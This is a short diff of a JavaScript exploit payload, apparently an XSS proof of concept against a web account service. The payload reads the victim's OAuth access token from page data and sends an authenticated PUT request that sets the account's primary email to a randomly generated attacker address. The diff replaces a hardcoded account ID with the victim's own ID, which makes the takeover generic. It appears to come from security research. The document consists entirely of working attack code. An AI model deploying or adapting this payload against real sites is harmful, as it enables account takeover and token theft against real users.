@@ -2,6 +2,7 @@ alert(document.domain);
 
 const oa2_token = create_dynamic_user_info.access_token;
 const attacker_email = "attacker"+(Math.random() + 1).toString(36).substring(7)+"@khara.one";
+const account_id = create_dynamic_user_info.account_id.split("-")[1];
 console.log( oa2_token );
 
 function submitRequest( oa2_token )
@@ -14,7 +15,7 @@ function submitRequest( oa2_token )
   xhr.setRequestHeader("Authorization", "OAuth "+ oa2_token);
   xhr.withCredentials = true;
   var body = "{\r\n" + 
-    "\"data\":\"{\\\"core\\\":{\\\"primaryEmail\\\":\\\"" + attacker_email + "\\\"}}\",\"headers\":{\"content-type\":\"application/json\"},\"type\":\"PUT\",\"req_service\":\"accounts\",\"url\":\"/v1/account/128117512060/globalInfo\"}\r\n" + 
+    "\"data\":\"{\\\"core\\\":{\\\"primaryEmail\\\":\\\"" + attacker_email + "\\\"}}\",\"headers\":{\"content-type\":\"application/json\"},\"type\":\"PUT\",\"req_service\":\"accounts\",\"url\":\"/v1/account/"+account_id+"/globalInfo\"}\r\n" + 
     "\r\n";
   var aBody = new Uint8Array(body.length);
   for (var i = 0; i < aBody.length; i++)
